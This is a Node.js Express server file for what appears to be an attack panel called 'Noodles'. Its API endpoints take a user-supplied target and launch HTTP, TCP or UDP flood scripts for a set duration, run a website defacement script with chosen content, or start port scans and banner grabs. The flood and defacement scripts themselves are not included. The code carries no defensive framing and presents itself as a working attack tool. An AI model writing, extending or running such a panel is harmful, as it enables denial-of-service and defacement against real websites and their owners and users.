const express = require('express');
const app = express();
const port = 3000;
const path = require('path');
const { spawn } = require('child_process');

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

function executeCommand(command, args) {
    return new Promise((resolve, reject) => {
        const process = spawn(command, args);
        let result = '';

        process.stdout.on('data', (data) => {
            result += data.toString();
            console.log(`stdout: ${data}`);
        });

        process.stderr.on('data', (data) => {
            console.error(`stderr: ${data}`);
            reject(data.toString());
        });

        process.on('close', (code) => {
            if (code === 0) {
                resolve(result);
            } else {
                reject(`Command failed with code ${code}`);
            }
        });
    });
}

app.post('/api/ddos', async (req, res) => {
    const target = req.body.target;
    const type = req.body.type;
    const duration = req.body.duration || 60;

    if (!target || !type) {
        return res.status(400).send({ status: 'Target and type are required' });
    }

    console.log(`DDoS attack requested: Target=${target}, Type=${type}, Duration=${duration}`);

    try {
        let scriptPath;
        let args;

        switch (type) {
            case 'http':
                scriptPath = path.join(__dirname, 'scripts', 'ddos', 'http_flood.js');
                break;
            case 'tcp':
                scriptPath = path.join(__dirname, 'scripts', 'ddos', 'tcp_flood.js');
                break;
            case 'udp':
                scriptPath = path.join(__dirname, 'scripts', 'ddos', 'udp_flood.js');
                break;
            default:
                return res.status(400).send({ status: 'Invalid DDoS attack type' });
        }

        if (!require('fs').existsSync(scriptPath)) {
            return res.status(500).send({ status: `${type.toUpperCase()} Flood script not found` });
        }

        args = [target, duration];
        await executeCommand('node', [scriptPath, ...args]);
        res.send({ status: `DDoS attack initiated (${type}) on ${target} for ${duration} seconds` });
    } catch (error) {
        console.error(`DDoS attack failed: ${error}`);
        res.status(500).send({ status: `DDoS attack failed: ${error}` });
    }
});

app.post('/api/defacement', async (req, res) => {
    const target = req.body.target;
    const action = req.body.action;
    const content = req.body.content;

    if (!target || !action) {
        return res.status(400).send({ status: 'Target and action are required' });
    }

    console.log(`Defacement requested: Target=${target}, Action=${action}`);

    try {
        const scriptPath = path.join(__dirname, 'scripts', 'defacement', 'deface.js');

        if (!require('fs').existsSync(scriptPath)) {
            return res.status(500).send({ status: 'Deface script not found' });
        }

        const args = [target, action, content];
        await executeCommand('node', [scriptPath, ...args]);
        res.send({ status: `Defacement initiated (${action}) on ${target}` });
    } catch (error) {
        console.error(`Defacement failed: ${error}`);
        res.status(500).send({ status: `Defacement failed: ${error}` });
    }
});

app.post('/api/connection', async (req, res) => {
    const target = req.body.target;
    const type = req.body.type;

    if (!target || !type) {
        return res.status(400).send({ status: 'Target and type are required' });
    }

    console.log(`Connection requested: Target=${target}, Type=${type}`);

    try {
        let scriptPath;
        let args;

        switch (type) {
            case 'portscan':
                scriptPath = path.join(__dirname, 'scripts', 'connection', 'port_scan.js');
                break;
            case 'bannergrab':
                scriptPath = path.join(__dirname, 'scripts', 'connection', 'banner_grab.js');
                break;
            default:
                return res.status(400).send({ status: 'Invalid connection type' });
        }

        if (!require('fs').existsSync(scriptPath)) {
            return res.status(500).send({ status: `${type.replace('scan', ' Scan').replace('grab', ' Grab')} script not found` });
        }

        args = [target];
        await executeCommand('node', [scriptPath, ...args]);
        res.send({ status: `Connection initiated (${type}) on ${target}` });
    } catch (error) {
        console.error(`Connection failed: ${error}`);
        res.status(500).send({ status: `Connection failed: ${error}` });
    }
});

app.get('/about', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'about.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`Noodles app listening on port ${port}`);
});